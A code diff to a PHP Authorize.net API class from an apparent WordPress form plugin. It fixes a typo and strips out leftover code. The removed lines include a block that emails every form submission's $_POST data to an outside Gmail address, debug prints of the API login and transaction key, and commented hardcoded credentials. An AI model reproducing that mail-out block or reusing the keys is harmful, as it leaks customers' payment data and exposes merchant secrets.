@@ -5,7 +5,7 @@
  */
 class FrmAuthNetApi {
 
-	private $endpont = 'xml/v1/request.api';
+	private $endpoint = 'xml/v1/request.api';
 
 	private $request = array();
 
@@ -42,6 +42,7 @@ class FrmAuthNetApi {
 	 */
 	public function signed_request( $request_type ) {
 		$this->prepare_signed_request( $request_type );
+
 		return $this->send_request();
 	}
 
@@ -53,9 +54,6 @@ class FrmAuthNetApi {
 	private function send_request() {
 		$settings   = new FrmAuthNetSettings();
 		$is_sandbox = ( 'sandbox' == $settings->settings->environment );
-
-		$is_sandbox = true;
-		
 		$prefix     = $is_sandbox ? 'apitest' : 'api';
 		$url        = 'https://' . $prefix . '.authorize.net/' . $this->endpoint;
 
@@ -150,42 +148,11 @@ class FrmAuthNetApi {
 		$authnet = new Dotfiler_authnet;
 		$authnet->init_authnet_credentials();
 
-		if( isset($_POST) ) {
-
-			$form_id = $_POST['form_id'];
-
-			$to = 'matrosovdream@gmail.com';
-			$subject = "POST Data $form_id";
-			$message = '$_POST Data: ' . PHP_EOL . PHP_EOL;
-			$message .= print_r($_POST, true);
-			$headers = 'From: your_email@example.com' . PHP_EOL;
-			$headers .= 'Content-Type: text/plain; charset=utf-8' . PHP_EOL;
-
-			wp_mail($to, $subject, $message, $headers);
-
-		}
-
-		/*
-		echo "<pre>";
-		print_r($_POST);
-		echo "</pre>";
-		die();
-		*/
-
 		// Get the API login ID from Global Settings.
 		$api_key = ( defined( 'AUTHORIZENET_API_LOGIN_ID' ) ? AUTHORIZENET_API_LOGIN_ID : $settings->settings->login_id );
 
 		// Get the API login ID from Global Settings.
 		$transaction_key = ( defined( 'AUTHORIZENET_TRANSACTION_KEY' ) ? AUTHORIZENET_TRANSACTION_KEY : $settings->settings->transaction_key );
-
-		/*
-		echo $api_key; echo "<br>";
-		echo $transaction_key;
-		die();
-		*/
-
-		//$api_key = '6CN4np2p';
-		//$transaction_key = '86T28b4f6Kn38nX4';
 
 		return array(
 			'name'           => $api_key,
@@ -198,6 +165,7 @@ class FrmAuthNetApi {
 	 */
 	private function add_basic_auth_header() {
 		$auth = $this->setup_api();
+
 		$this->request['Authorization'] = 'Basic ' . base64_encode( $auth['name'] . ':' . $auth['transactionKey'] );
 	}
 }
